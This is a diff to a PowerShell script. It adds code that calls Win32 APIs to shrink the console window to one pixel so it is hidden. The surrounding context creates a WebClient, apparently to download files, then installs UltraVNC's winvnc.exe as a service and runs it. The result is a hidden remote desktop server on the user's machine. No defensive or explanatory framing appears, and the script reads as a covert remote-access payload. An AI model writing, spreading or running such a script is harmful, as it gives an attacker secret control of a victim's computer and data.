@@ -1,3 +1,12 @@
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")] 
+public static extern IntPtr GetConsoleWindow();
+[DllImport("user32.dll")]
+public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int W, int H); '
+
+$consoleHWND = [Console.Window]::GetConsoleWindow();
+$consoleHWND
+[Console.Window]::MoveWindow($consoleHWND,0,0,1,1);
 cd $Env:USERPROFILE -ErrorAction Stop
 Start-Sleep -Seconds 1 -ErrorAction Stop
 $client = new-object System.Net.WebClient -ErrorAction Stop
@@ -10,3 +19,4 @@ Start-Sleep -Seconds 1 -ErrorAction Stop
 & 'C:\Program Files\uvnc bvba\UltraVNC\winvnc.exe' -install;
 Start-Sleep -Seconds 1 -ErrorAction Stop
 & 'C:\Program Files\uvnc bvba\UltraVNC\winvnc.exe' -run;
+exit
